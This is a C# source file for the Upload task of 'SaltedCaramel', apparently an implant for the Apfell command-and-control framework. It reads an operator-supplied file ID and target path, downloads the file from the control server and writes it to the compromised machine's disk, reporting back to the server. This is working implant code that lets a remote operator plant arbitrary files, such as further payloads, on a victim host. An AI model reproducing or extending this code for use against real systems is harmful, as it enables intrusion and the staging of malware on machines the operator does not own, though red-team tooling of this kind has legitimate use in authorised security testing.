using Newtonsoft.Json;
using Newtonsoft.Json.Linq;
using System;
using System.Diagnostics;
using System.IO;
using SaltedCaramel.Jobs;

/// <summary>
/// This task will upload a specified file from the Apfell server to the implant at the given file path
/// </summary>
namespace SaltedCaramel.Tasks
{
    public class Upload
    {
        public static byte[] GetFile(string file_id, SCImplant implant)
        {
            return implant.Profile.GetFile(file_id, implant);
        }

        public static void Execute(Job job, SCImplant implant)
        {
            SCTask task = job.Task;
            JObject json = (JObject)JsonConvert.DeserializeObject(task.@params);
            string file_id = json.Value<string>("file_id");
            string filepath = json.Value<string>("remote_path");

            Debug.WriteLine("[-] Upload - Tasked to get file " + file_id);

            // If file exists, don't write file
            if (File.Exists(filepath))
            {
                Debug.WriteLine($"[!] Upload - ERROR: File exists: {filepath}");
                job.Task.message = "ERROR: File exists.";
                implant.TrySendError(job);
            }
            else
            {
                // First we have to request the file from the server with a POST
                try // Try block for HTTP request
                {
                    byte[] output = implant.Profile.GetFile(file_id, implant);
                    try // Try block for writing file to disk
                    {
                        // Write file to disk
                        File.WriteAllBytes(filepath, output);
                        implant.TrySendComplete(task.id);
                        Debug.WriteLine("[+] Upload - File written: " + filepath);
                    }
                    catch (Exception e) // Catch exceptions from file write
                    {
                        // Something failed, so we need to tell the server about it
                        job.Task.message = e.Message;
                        implant.TrySendError(job);
                        Debug.WriteLine("[!] Upload - ERROR: " + e.Message);
                    }
                }
                catch (Exception e) // Catch exceptions from HTTP request
                {
                    // Something failed, so we need to tell the server about it
                    job.Task.message = e.Message;
                    implant.TrySendError(job);
                    Debug.WriteLine("[!] Upload - ERROR: " + e.Message);
                }
            }
        }
    }
}
